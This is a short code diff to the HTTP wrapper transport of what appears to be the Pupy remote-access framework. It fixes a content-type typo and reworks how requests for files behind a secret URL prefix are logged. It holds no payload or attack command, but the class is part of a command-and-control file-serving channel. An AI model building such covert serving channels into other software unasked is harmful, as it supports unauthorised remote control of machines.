@@ -51,7 +51,7 @@ class PupyHTTPWrapperServer(BasePupyTransport):
         if datasize:
             headers.update({
                 'Content-Length': datasize,
-                'Content-Type': 'application/octet-steram',
+                'Content-Type': 'application/octet-stream',
             })
 
         data = '\r\n'.join([
@@ -107,8 +107,9 @@ class PupyHTTPWrapperServer(BasePupyTransport):
                         if not (urlpath and urlpath[0] == wwwsecret):
                             self._handle_not_found()
                             if log:
-                                self.server.handler.display_error('{}: GET {} | SECRET = {}'.format(
-                                    '{}:{}'.format(*self.downstream.transport.peer[:2]), urlpath, wwwsecret))
+                                self.server.info('{}: GET {} | SECRET = {}'.format(
+                                    '{}:{}'.format(*self.downstream.transport.peer[:2]), urlpath, wwwsecret),
+                                                 error=True)
                             return
 
                         urlpath = urlpath[1:]
@@ -125,14 +126,19 @@ class PupyHTTPWrapperServer(BasePupyTransport):
                     if path.exists(filepath):
                         self._handle_file(filepath)
                         if log:
-                            self.server.handler.display_success('{}: GET {}'.format(
-                                '{}:{}'.format(*self.downstream.transport.peer[:2]), urlpath))
+                            message = urlpath
+                            if filepath in self.server.served_content:
+                                message = message + ' <' + self.server.served_content[filepath] + '>'
+
+                            self.server.info('{}: GET /{}'.format(
+                                '{}:{}'.format(*self.downstream.transport.peer[:2]), message))
 
                     else:
                         self._handle_not_found()
                         if log:
-                            self.server.handler.display_error('{}: GET {}'.format(
-                                '{}:{}'.format(*self.downstream.transport.peer[:2]), urlpath))
+                            self.server.info('{}: GET {}'.format(
+                                '{}:{}'.format(*self.downstream.transport.peer[:2]), urlpath),
+                                             error=True)
 
             except Exception, e:
                 print "Exception: {}".format(e)
